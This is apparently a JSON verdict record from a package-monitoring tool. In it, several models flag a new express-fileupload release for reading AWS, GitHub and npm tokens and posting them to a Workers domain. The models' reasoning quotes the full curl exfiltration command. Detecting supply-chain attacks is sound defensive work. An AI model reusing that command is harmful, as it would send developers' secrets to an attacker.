@@ -1,0 +1,48 @@
+{
+  "schema": 1,
+  "promptVersion": 3,
+  "judgedAt": "2026-09-22T19:35:09.158Z",
+  "judgement": {
+    "pkg": "express-fileupload",
+    "severity": "alarming",
+    "judged": true,
+    "tier": "judge",
+    "verdict": {
+      "meaning": "The new version reads AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN, and NPM_TOKEN from the environment, then spawns a shell to POST data via curl to cdn-assets-delivery.workers.dev:443.",
+      "explained": false,
+      "worthWaking": true,
+      "confidence": "high",
+      "note": "Credentials are being exfiltrated to an undocumented destination via a spawned downloader; the domain appears attacker-controlled (Cloudflare Workers)."
+    },
+    "second": {
+      "meaning": "The package now reads AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN, and NPM_TOKEN environment variables and exfiltrates their contents via a shell-spawned curl POST to cdn-assets-delivery.workers.dev.",
+      "explained": false,
+      "worthWaking": true,
+      "confidence": "high",
+      "note": ""
+    },
+    "accused": true,
+    "reason": "two models, independently, read this as credential exfiltration",
+    "spend": [
+      {
+        "model": "nvidia/NVIDIA-Nemotron-3-Nano-30B-A3B",
+        "costUsd": 0.000099,
+        "simulated": false,
+        "reasoning": "We need to output JSON only with fields: meaning, explained, worthWaking, confidence, note (optional). Must not add prose. Must interpret evidence.\n\nEvidence shows now reads env variables AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN, NPM_TOKEN; resolves cdn-assets-delivery.workers.dev; connects to it; spawns /bin/sh -c curl -s -X POST -d @- https://cdn-assets-delivery.workers.dev/c\n\nThus it's exfiltrating credentials to external endpoint. This is suspicious. Public record? No. So explained false. worthWaking true (credentials leaving). confidence high. note maybe empty.\n\nReturn JSON."
+      },
+      {
+        "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
+        "costUsd": 0.002355,
+        "simulated": false,
+        "reasoning": ""
+      },
+      {
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "costUsd": 0.000522,
+        "simulated": false,
+        "reasoning": "We need to output JSON per spec. The evidence shows now reads env vars AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN, NPM_TOKEN, resolves and connects to cdn-assets-delivery.workers.dev:443, spawns /bin/sh -c curl ... posting stdin to that URL. So meaning: exfiltrating credentials via curl to remote host. Explained? No public record mentions this behavior, so false. WorthWaking? Yes because credentials leaving machine, shell spawn, network connection to undocumented host => true. Confidence high. Note maybe empty.\n\nCheck rules: they said alarming (reads a credential it did not read before; spawns a shell or a downloader it did not spawn before). That matches.…"
+      }
+    ],
+    "costUsd": 0.002976
+  }
+}
